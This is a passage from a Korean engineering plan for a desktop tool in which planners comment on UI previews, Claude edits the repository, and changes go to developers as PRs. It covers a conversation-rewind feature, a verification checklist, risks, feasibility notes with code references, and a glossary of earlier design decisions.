- 파일: 데몬 `session-manager.ts`(`rewind` — 체크포인트 복원 → 대화록에서 절단점 UUID → fork 세션 생성 → 옛 세션 닫기 · 삭제), `session.ts`(fork 옵션), `server.ts`(`session.rewind`), `protocol`(메시지); 웹 `components.tsx`(답변 · 기획자 말풍선 hover 동작), `ChatColumn.tsx`(k 가 마지막이 아닐 때 `ConfirmDialog`), `useSessions.ts`(새 id 채택 · 제목 이어받기 · 목록 갱신), `Composer.tsx`(`고쳐서 다시 보내기` 가 문장을 넣고 전송 모드 표시)
- 테스트: `session-manager` 단위(스텁 CLI) — 절단점 UUID 를 대화록에서 고르는 순수 함수(마지막 답의 마지막 체인 항목 · 도구 결과 캐리어 케이스); `publish-e2e.mjs` — 두 턴 뒤 `session.rewind { turn: 2 }` → 체크포인트 2 가 복원되고 새 `sessionId` 가 오고 옛 id 는 목록에 없다, 스텁이 받은 두 번째 프롬프트가 고친 문장; `ui-publish-e2e.mjs` — 답변 hover `다시 요청` → 같은 제목의 대화 하나 · 답 하나, 기획자 말풍선 `고쳐서 다시 보내기` → 컴포저에 문장, 중간 답에서 누르면 확인 대화상자 문장 `이 답 이후의 답 N개도 함께 사라집니다`
- 수용: 마음에 안 드는 답에서 버튼 하나로 파일과 대화가 그 전으로 가고, 트리에 대화가 늘지 않는다. 거절 케이스에서 파일은 돌아가고 카드가 `기억은 그대로` 를 말한다

### 관찰 (반나절 + 반영 반나절, 코드는 반영분만) — 2 · 2b · 2c 뒤

기획자 한 명(만든 사람 · 데모 본 사람 제외)에게 목표만 주고 시킨다: "이 화면의 문구 둘을
고쳐 주세요"(핀을 쓰는지 · 채팅으로 가는지 · 모드 토글을 찾는지) · "고친 것을 개발자에게
보내 주세요"(상단 바에서 저장 → 넘기기를 찾는지 · 잠긴 이유를 읽는지) · "개발자가 뭐라고
했는지 봐 주세요"(상태 확인 → 개발자 코멘트 패널 → `답하기` 를 찾는지). 멈춘 자리 · 물어본 말 · 쓴 단어만 적는다.
여기서 확정하는 것: §0 소유자 결정 1–4(특히 `⌥+클릭` 을 스스로 찾는가 — 못 찾으면 모드
토글의 기본값을 켬으로), 칩 라벨 여섯, `다음 턴에 보냅니다` 문장, 코치 마크 ① 의 존속. **관찰이
이긴다** — 이미 구현된 문구 · 기본값과 다르면 관찰 쪽으로 고친다. 단 재작업은 문구 · 기본값 ·
표식 수준까지다: 구조(핀 · 칩 · 동작 셋)는 이 관찰로 뒤집지 않는다. 반영 반나절이 기간에 있다.

### 3. 검증 (1일)

- [ ] `pnpm typecheck`; `test:unit` · `test:publish` · `test:publish-ui` · `test:sidebar-ui` · `test:comments-ui`(빌드 뒤)
- [ ] 실제로(데스크톱 dev 실행, 참조 레포): 화면 하나 만들기 → 모드 없이 `⌥+클릭` 두 곳 → 하나는 `⏎ 보내기`, 하나는 `담아 두기` 뒤 막대로 보내기 → 턴 끝 → 핀 둘이 남아 있다 → 새로 고침 → 같은 자리 → 하나 `해결` → 사라짐 → 상단 바 `저장` → `저장됨` → `개발자에게 넘기기` → `개발자 검토 중 · #n` → 다시 `⌥+클릭` 보내기 → `저장 안 함 1건` 으로 칩이 바뀌고 `상태 확인` 이 그대로 있다
- [ ] 브라우저(D85): 미리보기에 포커스 → ⌘R → 미리보기만 새로 고침(채팅 그대로) → ⌘L → 주소창에 `pay` → 후보에서 `?state=error` 고르기 → ⌘[ → 앞 화면 → ⌘= 두 번 → `120%` 칩 → 모바일 폭 → 칩 사라짐 → 새 창 → OS 브라우저가 같은 화면 · 상태
- [ ] 루프(D86 · D87 · D88): 턴이 도는 중에 핀 하나 보내기 → `1건 대기` → 턴 끝 → 대기 줄 사라지고 Claude 답이 크롭을 언급한다 → 코멘트 카드에 썸네일 → 넘긴 PR 에 GitHub 에서 리뷰 코멘트 하나 + 질문 하나(실 레포 한 번) → `상태 확인 · 개발자 코멘트 2` → `고치기` → 카드 → Claude 가 고침 → `저장 안 함 N건`; 질문에 `답하기` → 첫 회 확인 → GitHub 에 기획자 이름으로 답글
- [ ] 문제 → Claude → 돌아옴(D89 · D90): 래퍼 없는 화면에서 `⌥+클릭` → 토스트 → `이 화면 Claude 에게 보여 주기` → 카드 → Claude 가 래퍼를 넣음 → 이제 핀이 붙는다 → 일부러 `check` 를 깨뜨린 채 `저장` → 게이트 카드 → Claude 가 고침 → **저장이 혼자 다시 돌아** `저장됨`
- [ ] 따라가기 · 안내(D91 · D92 · D93): 다른 화면을 보는 채로 핀 보내기 → 턴 끝 → 미리보기가 Claude 가 고친 화면 · 상태로 이동(선택기를 만졌으면 토스트) → 핀이 `확인해 주세요` 로 강조 → `해결` → 설정 → `안내 다시 보기` 로 초기화한 뒤 코치 마크 셋이 각각 한 번 → `⌘/` 시트 → 넘긴 PR 본문에 `### 수정 요청` 절이 화면 제목으로
- [ ] 첫 바퀴(D94): `cds-design.json` 없는 실제 레포(사내 Next 앱 하나) 추가 → `Claude 가 연결 준비하기` → 몇 분 → 미리보기 ready · 선택기에 화면 → 저장 → 넘기기 → PR 에 `cds-design.json` · 브리지 · `CLAUDE.md` 가 들어 있다
- [ ] 되감기(D95): 답 두 개 받기 → 두 번째 답에 `다시 요청` → 파일이 두 번째 답 이전으로 · 대화록에서 두 번째 답이 사라짐 · 새 답 → 첫 답의 기획자 말풍선에서 `고쳐서 다시 보내기` → 확인 대화상자 → 컴포저에 문장 → 전송 → 답 하나만 남는다
- [ ] README 가 참인지 다시 읽는다 — 특히 프로토콜 버전 표기(지금 README 는 `v8`(§전체 구조) 과 `v9`(§패키지) 를 같이 쓰고 코드는 `PROTOCOL_VERSION = 10`, `protocol/src/index.ts:21`) → 2단계 끝의 v11 로 통일. 이 문서는 여기까지 끝난 뒤 지우고, §0 의 소유자 결정 표만 README §번호 대응표 위에 한 줄 요약으로 남긴다

## 7. 리스크

- **`path` 는 깨진다**(D78). `nth-of-type` 은 Claude 가 형제를 하나 넣으면 옆으로 간다 — 폴백은
  D78 에 있다. 더 튼튼한 신원(레포가 `data-cds-id` 를 심는 것)은 레포 계약을 늘리는 일이라 이
  판에 넣지 않는다 — 어긋남이 실제로 잦으면 §8 로.
- **`⌥+클릭` 이 페이지 단축키와 겹친다**(D79). 캡처 단계에서 먼저 받으므로 페이지는
  못 본다 — 곧 목업이 `⌥+클릭` 을 쓰는 인터랙션은 도구 안에서 재현 불가다. 받아들인다;
  힌트는 툴팁 한 문장. 우클릭 메뉴는 남겨 둔 대안이다.
- **오버레이가 항상 떠 있다**(D79). 루트는 `pointer-events:none`, 핀 · 말풍선만 `auto`.
  z-index 최상위는 지금과 같다. 레포의 모달이 핀 아래로 들어갈 수 있다 — 핀은 모달
  안 요소를 가리키지 않는 한 모달 밖에 있으니 겹침은 시각적일 뿐이다.
- **핀이 쌓인다**(D78). 해결하지 않으면 남는다. 팝오버에 `모두 해결` 하나면 충분하고,
  `comments.json` 은 프로젝트당 파일 하나라 크기는 문제가 아니다.
- **동작 셋이 상단 바를 넓힌다**(D82). 1280 한 줄은 목업으로 먼저 확인하고(0단계),
  1100 미만 축약 규칙이 있다. 그래도 넘치면 `상태 확인` 을 칩 클릭으로 되돌린다(지금
  칩이 그 뜻으로 클릭을 받는다, `ScreenPanel.tsx:522-526`).
- **"저장 안 함" 이 PR 을 가린다**(D82 표). `unsaved` 가 `handed` 를 이기므로 칩만 보면
  PR 이 열린 것을 모른다. `상태 확인` 버튼의 존재와 칩 title 이 말한다. 관찰에서
  기획자가 이것을 놓치면 칩을 둘로 쪼갠다(`저장 안 함 3건 · PR #12`).
- **`deriveStage` 를 부르는 곳이 남는다**(D81). 2단계 수용의 `grep 0건` 이 잡는다.
- **메뉴가 기본 역할을 잃는다**(D85). `toggleDevTools` 는 dev 에서만 남기고 패키징 앱에서는
  빠진다 — 기획자에게 필요 없고, 문제 해결은 설정 → 문제 해결이 자리다. 개발자가 패키징
  앱을 디버그해야 하면 `--remote-debugging-port` 가 길이다. `forceReload` 는 미리보기의
  `reloadIgnoringCache` 로 ⇧⌘R 에 두지 않는다 — 하드 리로드는 dev 서버의 일이다.
- **배율과 에뮬레이션이 겹친다**(D85 ⓔ). `setZoomFactor` 는 페이지 배율, `enableDeviceEmulation`
  은 뷰포트 — Chromium 에서 둘은 독립이지만 모바일 에뮬레이션 + 150% 는 가로 스크롤을
  만든다. 폭을 바꾸면 배율을 100% 로 되돌린다(한 줄) — 1b 테스트 ⓟ 가 본다.
- **`⌘[` 가 컴포저의 들여쓰기와 겹친다**(D85 ⓒ). 컴포저는 마크다운 textarea 라 `⌘[` 를 쓰지
  않는다 — 확인만. 겹치면 `⌘←`/`⌘→` 대신 Alt 조합으로.
- **큐의 뜻은 SDK 것이다**(D86). 턴 중 밀어 넣은 메시지를 CLI 가 다음 턴으로 미루는지 현재
  턴에 끼워 넣는지는 우리가 정하지 않는다. `test:daemon` 한 번(실 Claude)으로 확인하고,
  끼어드는 것이면 문장을 `Claude 가 이어서 봅니다` 로 바꾼다 — 대기 줄 UI 는 같다.
- **크롭이 토큰이다**(D87). 봉투당 6장 · 600px · q70 — D61 의 12장 상한과 같은 결의 숫자.
  에뮬레이션 중에도 preload 의 rect 와 `capturePage` 의 rect 는 같은 문서 좌표라 어긋나지
  않지만, 1단계 테스트 ⓙ 가 모바일 폭에서 한 번 더 확인한다.
- **리뷰 코멘트는 코드 어휘다**(D88). 개발자는 `Button.tsx:42` 라고 쓴다. 카드 첫 줄은 본문만,
  `path:line` 은 `자세히` — D37 · D38 그대로. 처리 표식이 localStorage 라 기계를 바꾸면
  다시 보인다 — 받아들인다(사이클은 짧다).
- **Windows 의 Alt 가 메뉴 바를 부른다**(D79 · D85). `autoHideMenuBar: true` 는 Alt 한 번에
  메뉴 바를 내린다 — `Alt+클릭` 마다 깜빡인다. D85 가 메뉴를 만들 때 Windows 는
  `setMenuBarVisibility(false)` 로 아예 숨긴다; 가속키는 보이지 않아도 산다.
- **확인 대화상자 하나가 셋을 대신한다**(0단계 ③). 미리보기 뷰 위에 그리는 것은 `cover` 를
  건다(D65) — 잊으면 대화상자가 뷰 아래로 들어간다. `usePreviewCover` 를 쓴다.
- **전체 캡처가 토큰이다**(D89). 한 번에 한 장 · 1200px · q70. 기획자가 연타하면 같은 턴이
  겹치므로 `두 번째 요청` 표식과 함께 두 번째부터는 대화에 `이미 보냈습니다 — 답을 기다려
  주세요` 토스트로 막는다(턴이 도는 동안).
- **자동 재시도가 다른 것을 저장한다**(D90 ⓐ). Claude 가 게이트를 고치는 사이 기획자가 핀을
  더 보냈으면 재시도 저장에 그 변경도 실린다 — 저장 검토(D51)가 그때의 diff 전부를 요약하니
  거짓은 아니다. 재시도는 `저장 검토` 를 **열지 않고** 바로 저장한다(기획자가 이미 한 번
  검토했고, 두 번 열면 "왜 또?"). 게이트가 `build`(넘기기)면 넘기기 대화상자도 다시 열지 않는다.
- **도구가 기획자 이름으로 GitHub 에 쓴다**(D88 `답하기`). 토큰은 기획자 것이고 답글은 기획자
  이름으로 붙는다 — 첫 회 확인 한 번, 그 뒤는 묻지 않는다. 기획자가 쓴 문장만 나간다(도구가
  덧붙이는 서명 없음).
- **`push` 사유 분기가 문자열이다**(D90 ⓑ). D41 이 문자열 분기를 없앤 이유와 같은 위험 —
  그래서 모르면 Claude 쪽으로 보내고, 분기 문자열은 `repo.ts` 상수 하나에 모아 테스트가 잡는다.
- **따라가기가 기획자의 시선을 뺏는다**(D91). 다른 화면을 검토하는 도중 턴이 끝나면 미리보기가
  튄다 — 그래서 "그 턴 동안 직접 움직였으면 토스트만" 이 규칙이고, 설정으로 끈다. 여러 화면을
  고친 턴은 **마지막** 화면으로 간다(Claude 가 마지막에 확인한 곳이 보통 결론이다).
- **코치 마크가 잔소리가 된다**(D92). 셋 · 한 번 · `알겠어요` 하나 — 늘리지 않는다. 관찰에서
  기획자가 셋 다 무시하고도 `⌥+클릭` 을 찾으면 ① 을 뺀다.
- **PR 본문이 길어진다**(D93). 20건 상한 + `외 N건`. 해결 표시는 기획자의 `해결` 이라 개발자의
  판단과 다를 수 있다 — 절 머리에 `기획자가 확인한 것` 한 문장.
- **Claude 가 쓴 명령이 기획자 기계에서 돈다**(D94). `preview.command` 는 `shell: true` 다(`repo.ts:1827`).
  화이트리스트(`package.json#scripts` 의 스크립트만 · 락파일이 정하는 install · 포트 범위)가 유일한
  울타리고, 벗어나면 **실행하지 않고** 멈춘다 — "그래도 실행" 버튼은 없다. 레포의 스크립트 자체가
  위험한 경우는 레포 개발자가 쓴 JSON 을 믿는 지금과 같은 수준이다.
- **참조 브리지는 Next.js 것이다**(D94). Vite · Remix 는 Claude 가 계약(봉투 · 래퍼 속성)을 보고
  옮긴다; 비-JS · 모노레포 루트 · `package.json` 없는 레포는 폴백(지금 문장)이다. 첫 추가가 몇 분
  걸린다 — `preparing` 문장과 PiP(D63)가 기다림을 설명한다.
- **준비 커밋이 개발자에게 거절될 수 있다**(D94). 그게 게이트다 — 거절되면 프로젝트를 지운다.
  브리지가 dev 전용이고 프로덕션 번들에 안 들어간다는 것을 `CLAUDE.md` 템플릿과 PR 본문 첫 줄이
  말한다.
- **절단 재개가 거절될 수 있다**(D95). `resumeDropsTurn` 검증은 버리는 범위에 그 턴의 것만 있을 때
  통과한다 — 턴 중 끼어든 대기 메시지(D86)가 있으면 거절된다. 거절은 결정적이라 재시도하지 않고
  파일만 복원 + 새 턴 + `기억은 그대로` 한 줄. 스파이크가 이 경계를 먼저 본다.
- **옛 대화록을 지운다**(D95). fork 가 성공한 뒤에만, D76 경로로. 기획자가 "그 답을 버린다" 고 누른
  것이라 확인은 마지막 답이 아닐 때만 묻는다. 지우기 전에 fork 가 실패하면 옛 대화가 그대로 남는다 —
  잃는 것은 없다.

## 8. 열어둔 것 (이 판 이후)

- **화면별 상태 점.** 선택기 항목마다 `변경 있음 · 넘김 · 반영됨`. 바뀐 파일 → 화면
  대응이 필요하다 — 브리지의 `cds-design.screens` 항목에 `files?: string[]` 을 선택으로
  받거나, 데몬이 저장 diff 의 경로를 라우트 규칙(`/<feature>/<Screen>`)으로 추정한다.
  전자는 레포 계약, 후자는 "도구는 레포 배치를 읽지 않는다" 원칙에 어긋난다. 여러
  화면이 동시에 다른 단계에 서는 것이 실제로 관찰되면 전자로 연다.
- **튼튼한 요소 신원.** 레포가 `data-cds-id` 를 심으면 `path` 대신 그것을 앵커로.
  참조 레포 `CLAUDE.md` 한 줄 + 오버레이 우선순위 한 줄이지만, 레포 계약을 늘린다.
- **브라우저 개발 경로의 핀.** D70 이 iframe 에 코멘트를 두지 않기로 했다. 개발자
  전용 경로라 급하지 않다.
- **저장 검토를 화면 Before/After 로 · 상태 전부 캡처 · 화면 피커 썸네일.** 셋이 한 덩어리다 —
  "저장마다 shots 캐시" 가 생겨야 전부 부산물로 나온다. D56 의 shots 는 넘기기 때만 찍는데,
  캡처 자체는 싸다(비싼 것은 `build`). 다음 판("캡처 판")의 주제.
- **문구 바로 고치기(AI 턴 없이).** 핀의 `text` 가 `<화면>.mock.ts` 에서 유일하면 치환 → HMR,
  턴도 구독 사용량도 안 쓴다. 원칙과 부딛힌다 — 도구가 레포 배치를 읽어야 한다. 브리지가
  문구 출처를 선언하는 계약이 먼저.
- **답변 뒤 후속 제안 칩.** Claude 가 마커를 달아 칩이 되게 하려면 "마커는 사용자 블록에서만
  파싱한다"(앞 판, 스푸핑 방지)를 뒤집어야 한다. 맞는 길은 다른 채널 — D61 의 MCP 서버에
  `suggest_next` 도구 하나 — 이고 설계가 필요하다.
- **집중 모드(`⌘\`).** 사이드바 · 채팅을 접고 미리보기만, 칩은 유지. 싸지만 루프와 무관하고
  D85 ⓑ 가 시연의 절반을 덮는다.
- **예시 프로젝트로 시작.** 온보딩이 빈 피커에서 끝난다 — 픽스처 브리지를 데모 레포로
  승격하면 토큰 없이 첫 미리보기를 본다. 온보딩 판.
- **저장하면 개발자 코멘트에 자동 답글.** `고치기` 를 거친 저장이 끝나면 그 코멘트에
  `수정했습니다 · <저장 메모>` 를 도구가 단다 — 개발자가 다시 볼 이유를 알고 기획자는 아무것도
  안 한다. D88 의 `답하기` 선로 위 한 줄이지만 "도구가 내 이름으로 자동으로 쓴다" 는 확인이
  하나 더 필요해서 관찰 뒤에.
- **GitHub 쪽 CI 실패.** `check-runs` 를 `상태 확인` 이 읽으면 `개발자 검토 중` 옆에 `검사 실패`
  가 서고 출력은 게이트처럼 Claude 과제가 될 수 있다. 개발자 팀의 CI 구성을 알아야 해서 그 팀에
  물은 뒤.
- **핀에 참고 이미지.** "이렇게 바꿔 주세요" 는 말보다 그림이다(피그마 캡처). 편집기에 📎 —
  D87 의 `images` 선로 그대로지만, 샌드박스 preload 는 파일 대화상자를 못 열어 메인 경유
  IPC(`dialog.showOpenDialog` → 읽기 → base64)가 하나 더 필요하다. 관찰에서 기획자가 채팅에
  이미지를 붙이며 핀을 가리키는 것이 보이면 연다.
- **대화 분기.** 한 답변에서 갈라져 두 대안을 나란히 시험하는 것. SDK `forkSession` 은 있지만 클론이
  하나라 두 갈래가 같은 파일을 밟는다 — 대화당 worktree(아래 "레포 안에서 작업 여럿")가 먼저다.
  그때 D95 의 절단 · fork 코드가 그대로 재료다.

## 9. 구현 가능성 판단 — 2026-09-11, 코드 기준

**막는 것은 없다.**

- D78: 봉투 항목의 `element` 가 이미 `component · text · path · rect` 를 갖는다
  (`CdsDesignCommentTarget`, `preview-preload.ts:62-72`). `recordComments` 가 그 중 둘만
  고른다(`ScreenPanel.tsx:455-458`) — 하나 더 넘기는 일이다. 저장소는 행 단위 검증이라
  (`comments.ts:16-28`) 선택 필드 하나가 들어간다.
- D78 재전송: 뷰가 새로 고침마다 모드를 다시 보내는 자리가 있다(`preview-view.ts:236-237`)
  — 핀 목록도 같은 훅이다. 뷰 → 웹 채널은 `send()` 하나로 통일돼 있다(`:290-300`).
- D79: 클릭 · 호버 리스너는 이미 `document` 캡처 단계에 있고 `mode` 한 변수로 게이트된다
  (`:198-236`) — 조건에 `altKey` 를 더한다. 루트 마운트 · 해제는 `setMode` 한 함수다
  (`:145-158`).
- D80: 편집기 버튼과 막대 전송이 같은 함수 안에 있다(`:288-344`) — 봉투 만들기를
  함수로 빼서 둘이 부른다.
- D81 · D82: 판정 입력은 전부 `RepoStatus` 에 있고(`pendingChanges · branch · handoff ·
  phase`), `running` 은 세션 상태다 — `deriveStage` 의 입력과 같다. 상단 바 · 칩 · 메뉴가
  이미 `ScreenPanel` 한 컴포넌트다(`:581-711`).
- D83: `새 대화` 입구 다섯이 있어 스테퍼의 주 버튼을 잃어도 길이 끊기지 않는다(§0).
- D84: `ensureCycleBranch` 의 `setCycle` 인자 하나(`repo.ts:822`)와 `publish-e2e` 의 이어 붙이기.
  GitHub fixture(`CDS_DESIGN_GITHUB_FIXTURE`)가 녹화된 REST 짝이라 두 번째 `createPullRequest`
  응답을 fixture 에 하나 더 녹음해야 한다 — 코드보다 fixture 손질이 일이다.
- D85: ⓐ 는 채널 · preload · 타입이 전부 있고 구독 한 줄이 빠졌다(`NativeHost.tsx:88-107` 의
  배열에 항목 하나). ⓑ 는 `PreviewHost` 가 `location` 을 이미 갖고 있다(`:149`). ⓒ 는
  `plannerPreview` 가 `main.ts:298` 에서 만들어지고 `registerPreviewIpc` 가 같은 자리라
  메뉴 빌더에 그 참조를 넘기면 된다 — `reload · history · zoom` 은 뷰의 메서드다. ⓓ 는
  `screens` 가 `PreviewHost` 의 prop 이다. ⓔ 는 `emulate()` 옆에 메서드 하나(`preview-view.ts:175`).
  `desktop-smoke.mjs` 가 이미 `Menu` 없이 창을 띄우고 있으니, 메뉴가 생겨도 스모크는 그대로다.
- D86: `user.echo` 가 `send` 즉시 온다(`session.ts:536`) — 대화록에는 이미 보인다; 빠진 것은
  "다음 턴" 이라는 말 한 줄과 셈이다. `⌥Enter` 는 `interrupt()`(`:542`) 뒤 `send` 두 호출.
- D87: `element.rect` 는 봉투에 있고(`preview-preload.ts:70`), `capturePage` 는 D56 · D61 이
  쓰는 API, `session.send(images)` 는 컴포저 첨부의 선로(`:486-504`). 새 것은 preload 의
  `capture` 명령 하나.
- D88: `changesRequested` 가 이미 `reviews` 를 읽는다(`github.ts:370-386`) — `comments` 호출
  하나와 응답 필드. fixture 녹음이 일이다(D84 와 같은 파일).
- 결함 ①: `Session.interrupt()` 가 `this.run.interrupt()` 만 부른다(`:542-545`) — 표식 하나와
  catch 의 분기.
- D89: `capturePage()` 전체는 D56 · D61 이 쓰는 호출이고, 콘솔은 `console-message` 리스너가
  이미 있다(`preview-view.ts:247`) — 배열 하나. 마커 `error` 는 `ErrorMarkerKind` 값 하나 추가.
  `⌥+클릭` 무반응 자리는 `describeElement` 가 `null` 을 돌려주는 분기(`preview-preload.ts:229`).
- D90: `diff.status` 에 `stage: "failed"` · `gate` 가 이미 온다 — 웹의 상태 하나와 `turn.end`
  구독. `failGate` 의 `pr` 분기는 `onSessionTurn` 호출을 건너뛰는 한 줄. `push` 분기만 새 판단.
- D91: `screen_open` 핸들러가 `driver.open` 을 부르는 자리(`preview-tools.ts:185`)에 콜백 한 줄;
  `session.ts` 는 이미 `events.onEvent` 로 모든 이벤트를 흘린다(`:283`). 웹의 `foldEvent` 는
  exhaustive `switch` 라(`daemon-client.ts:59-221`) 새 종류에 `case` 를 더하지 않으면 **타입 오류로
  잡힌다** — 빠뜨릴 수 없는 구조. 지금 PiP 라벨이 기획자 뷰 위치를 읽는 것(`ScreenPanel.tsx:546-559`)은
  D61 때 Claude 의 라우트가 웹에 없어서였다 — D91 이 그 결핍을 채운다.
- D92: 코치 마크 앵커 셋은 전부 `ScreenPanel` · `PreviewHost` 의 요소라 ref 셋. 단축키 상수를
  `protocol` 에 두는 이유는 데스크톱 `menu.ts` 와 웹 `ShortcutsSheet` 가 같은 배열을 import 해야
  하기 때문 — `protocol` 은 둘 다의 의존이다.
- D93: `runHandoff` 는 본문을 이미 조립한다(`repo.ts:901` `attachShots` 옆) — `readComments` 한 번과
  절 하나. 브랜치 생성 시각은 `ensureCycleBranch` 가 기록한다(D84 와 같은 함수).
- D94: 게이트 둘의 위치가 정확히 알려져 있고(`RepoPicker.tsx:207` · `repo.ts:1621`), 세션 생성의 전제가
  클론 존재뿐이라(`server.ts:1021`) 데몬이 `preparing` 에서 대화를 열 수 있다. 데몬이 대화를 여는
  선례는 코멘트 봉투(`PageWorkspace.tsx:236` — 웹이 열지만 같은 `session.create`). 마커 종류 `brief`
  는 이미 있다. 새 것은 순수 검증 함수 하나와 템플릿 상수 — 템플릿은 참조 레포에서 뽑는다(0단계의
  "reference-repo 는 트리에 없다" 전제와 같은 자리, GitHub 에서 읽어 커밋).
- D95: SDK 옵션 셋(`resume` · `resumeSessionAt` · `forkSession`)이 타입에 있고(`sdk.d.ts:1574, 1925, 1939`),
  체크포인트 복원은 D52 가 이미 한다(`ChatColumn.tsx:120`). 새 것은 절단점 UUID 를 대화록에서 고르는
  함수와 세션 갈아타기. 거절 규칙이 문서화돼 있어(`:1941-1954`) 폴백을 미리 정할 수 있다.

**전제 하나.** `reference-repo/` 는 이 트리에 없다 — 3단계의 실제 검증은 참조 레포를
GitHub 에서 프로젝트로 추가해 돈다. 오프라인 스위트는 전부 fixture 레포라 상관없다.

**틀리기 쉬운 자리 다섯.**
- 오버레이가 요소 참조(`anchor: Element`)를 쥔 채 핫 리로드를 지나면 죽은 노드를
  가리킨다 — 기록 핀은 `path` 로 매번 다시 푼다(D78). 초안 핀은 지금처럼 참조를 쥔다
  (화면이 바뀌면 지워지므로 짧게 산다).
- `⌥+클릭` 의 `preventDefault` 는 **캡처 단계**여야 한다 — 버블 단계면 페이지 핸들러가
  먼저 돌아 모달이 열린 뒤 핀이 찍힌다.
- 봉투의 `screen` 은 앞 슬래시가 없는데(`ScreenPanel.tsx:445` 가 `/${envelope.screen}` 로
  라우트와 맞춘다) `publish-e2e` 의 fixture 행은 `"/member/MemberList"` 로 쓴다(`:558`). 기록
  핀은 `[data-screen]` 값과 **문자 그대로** 비교하므로 `comments.record` 가 앞 슬래시를 떼어
  정규화한다(한 줄) — fixture 도 고친다.
- 캡처 세 박자(D87)는 `visibility:hidden` 뒤 **한 프레임**을 기다려야 한다 — 같은 틱에
  `capturePage` 를 부르면 핀이 찍힌다. preload 가 `requestAnimationFrame` 두 번 뒤에 응답한다.
- 절단점은 **남기는 턴의 마지막 체인 항목**이다(D95) — 마지막 답변 메시지가 아니라, 도구 결과
  캐리어가 뒤에 있으면 그것. SDK 문서의 규칙 그대로(`sdk.d.ts:1982-1989`); 순수 함수로 빼고 케이스를
  단위 테스트에 박는다.

**기간.** 0 1일 · 1 5~6일 · 1b 반나절 · 2 4~5일 · 2b 1.5~2일 · 2c 1.5~2일 · 관찰 반나절 + 반영 반나절 · 3 1일 = 순차 **약 16~19.5일**.
1 · 1b · 2 · 2b · 2c 를 동시에 가면 임계 경로는 1단계라 0 + 1 + 관찰 · 반영 + 3 = **8~9일**(2b · 2c 는 2 와
병행 — 2b 는 `ScreenPanel` 의 `ProgressPanel` 구역과 `repo.ts` 의 `sync` 구역, 2c 는 말풍선 hover 와
`session-manager` 만 건드린다).

## 10. 앞 판 번호 풀이 — 이 문서가 부르는 것만

앞 판 문서는 지워졌고 README 는 기능을 번호 없이 적는다. 이 문서가 근거로 부르는 앞 판 결정을
한 줄씩 — 코드 주석의 `PLAN D<n>` 도 같은 뜻이다.

| 번호 | 뜻 |
|---|---|
| D33 | 프로토콜 범프는 마지막 선로 변경이 들어가는 단계 끝에 한 번 |
| D37 · D38 | 기획자 표면에 도구 이름 · 파일 경로 · 컴포넌트명 · CSS 경로를 쓰지 않는다 — 카드 `자세히` 에만 |
| D41 | 오류 분류는 데몬이 `errorKind` 로 한다 — 웹의 문자열 분기 금지 |
| D44 · D45 | 스테퍼(다섯 단계 레일 + 주 버튼 하나) · 판정 순수 함수 `deriveStage` — 이 판이 지운다 |
| D49 | 미리보기 오류 배너 → `error` 마커 턴 |
| D51 · D52 · D53 | 저장 검토(Claude 가 쓴 diff 요약 + 파일은 `자세히`) · 턴마다 체크포인트 · 저장 기록과 되돌리기 |
| D55 | 컴포저 위 빠른 동작 칩 |
| D56 | 넘기기 때 화면 캡처(`shots`)를 PR 브랜치에 커밋 |
| D57 · D58 | `comments.json` 저장소 · 툴바 `💬 코멘트` 모드 토글 — 이 판이 확장한다 |
| D59 | 대화는 사이드바 트리의 자식 |
| D61 · D63 | Claude 의 오프스크린 브라우저(인프로세스 MCP `cds-preview`, 캡처 턴당 12장) · PiP `Claude가 보는 중` |
| D64 – D71 | 데스크톱 미리보기 = `WebContentsView`(D64) · 모달 위 `cover` 규칙(D65) · 경로만 받는 주소창(D66) · preload 오버레이(D67) · 레포 브리지 계약(D68) · 실제 장치 에뮬레이션 · 오류 배너(D69) · 브라우저 개발 경로는 iframe 만(D70) · 뷰 → 웹 키 전달(D71) |
| D76 · D77 | 대화 지우기 확인 · 프로젝트 지우기가 대화록도 지운다 |
| D28 · D31 | `cds-design.json` 없는 레포는 피커가 막는다 · 목록에 없는 레포는 주소로 추가 — D94 가 D28 을 선택지로 바꾼다 |
